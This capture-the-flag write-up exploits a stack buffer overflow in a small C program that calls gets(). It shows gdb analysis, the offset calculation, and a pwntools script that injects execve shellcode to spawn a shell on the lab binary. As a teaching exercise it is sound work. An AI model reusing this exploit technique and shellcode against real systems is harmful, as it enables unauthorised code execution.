Let's take a look at the source code...

```
#include <stdio.h>
#include <string.h>

void nothing()
{
	char* buf0[50];
	printf("%p\n", &buf0);
	gets(buf0);
}

int main()
{
	printf("Even if you do hack this elf, what are you going to do?. You should really get back to research.\n");
	nothing();
}
```

So we can see that it suffers from the same buffer overflow vulnerabillity as the rest. However unlike the previous levels, there isn't anywhere in here that will print out "Level Cleared!". So we will have to somehow pop a shell and read the "out file". What we can do, is we can push our own shellcode (shellcode is precompiled assembly code that you can push onto a program of the same architecture, and it should be able to run) onto the stack than overwrite the rip register to execute the shellocde. So essentially we will be writing code to the program, than executing that code. We can see that the elf prints out the address of the buffer, so that is one less thing we have to worry about. The first thing we will need is to find out how many characters we will have to write to reach the rip register.

```
gdb-peda$ disas nothing
Dump of assembler code for function nothing:
   0x0000000000400576 <+0>:	push   rbp
   0x0000000000400577 <+1>:	mov    rbp,rsp
   0x000000000040057a <+4>:	sub    rsp,0x190
   0x0000000000400581 <+11>:	lea    rax,[rbp-0x190]
   0x0000000000400588 <+18>:	mov    rsi,rax
   0x000000000040058b <+21>:	mov    edi,0x400658
   0x0000000000400590 <+26>:	mov    eax,0x0
   0x0000000000400595 <+31>:	call   0x400440 <printf@plt>
   0x000000000040059a <+36>:	lea    rax,[rbp-0x190]
   0x00000000004005a1 <+43>:	mov    rdi,rax
   0x00000000004005a4 <+46>:	mov    eax,0x0
   0x00000000004005a9 <+51>:	call   0x400460 <gets@plt>
   0x00000000004005ae <+56>:	nop
   0x00000000004005af <+57>:	leave  
   0x00000000004005b0 <+58>:	ret    
End of assembler dump.
gdb-peda$ b *nothing+56
Breakpoint 1 at 0x4005ae
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b4_64/b4_64 
Even if you do hack this elf, what are you going to do?. You should really get back to research.
0x7fffffffdcc0
75395128
```

One wall of text later...

```
gdb-peda$ x/s $rbp-0x190
0x7fffffffdcc0:	"75395128"
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffde60:
 rip = 0x4005ae in nothing; saved rip = 0x4005c9
 called by frame at 0x7fffffffde70
 Arglist at 0x7fffffffde50, args: 
 Locals at 0x7fffffffde50, Previous frame's sp is 0x7fffffffde60
 Saved registers:
  rbp at 0x7fffffffde50, rip at 0x7fffffffde58
```

So we have the addess of the buffer (0x7fffffffdcc0) and the rip register (0x7fffffffde58). Now to find the distance we need to reach it.

```
>>> 0x7fffffffdcc0 - 0x7fffffffde58
-408
```

So we will have 408 bytes untill we reach the rip register. So we have the offset, and the address that we want to write to. The last thing we will need is the shellcode. For shellcode you can either write it yourself, or look it up online. I typically get my shellcode from this website.

http://shell-storm.org/shellcode/

and a link to the exact shell code I'm using for this exploit

http://shell-storm.org/shellcode/files/shellcode-806.php

Now keep in mind, when you are picking/writing your shellcode you have to have the same binary architecture. We are currently dealing with a 64 bit linux elf, so if you are picking shellcode from that website it should be under the Linux/x86-64 category.

Now that we have our shellcode, the address of the buffer, and the offset we can write our exploit. We will have to adjust the filler we use to reach the rip register to allow room for the shellcode. The shellcode I am using is 27 bytes long, so my filler will be 408 - 27 = 381 characters long. However this time I will actually write a python script instead of just a one liner. The reason for this is the address of the buffer will change under certain circumstances, so it is better to read it every time you run the exploit instead of just hardcoding it in. For this exploit I used pwntools, because it is a really big help and takes care of a lot of the hassle for me. Here is my exploit.

```
#Import the pwntools library.
from pwn import *

#The process is like an actualy command you run, so you will have to adjust the path if your exploit isn't in the same directory as the challenge.
target = process("./b4_64")

#Just receive the first line, which for our purposes isn't important.
target.recvline()

#Store the address of the buffer in a variable, and strip away the newline to prevent conversion issues
address = target.recvline().strip("\n")

#Convert the string to a hexidecimal
address = int(address, 16)

#Pack the hexidecimal in little endian for 32 bit systems
address = p64(address)
print address
#Store the shellcode in a variable
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#Make the filler to reach the eip register
filler = "0"*381

#Craft the payload
payload = shellcode + filler + address

#Send the payload
target.sendline(payload)

#Drop into interactive mode so you can use the shell
target.interactive()
```

Now let's try out the exploit...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b4_64$ python exploit.py 
[+] Starting local process './b4_64': Done
\x00��\xff\xff\x7f\x00\x00
[*] Switching to interactive mode
$ echo Is this working?
Is this working?
$ ls
Readme.md  b4_64  b4_64.c  exploit.py  out  peda-session-b4_64.txt
$ cat out
I see, you brough your own topics to research. Level Cleared!
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './b4_64' stopped with exit code 0
[*] Got EOF while sending in interactive
```

And just like that, we pwned the binary. 
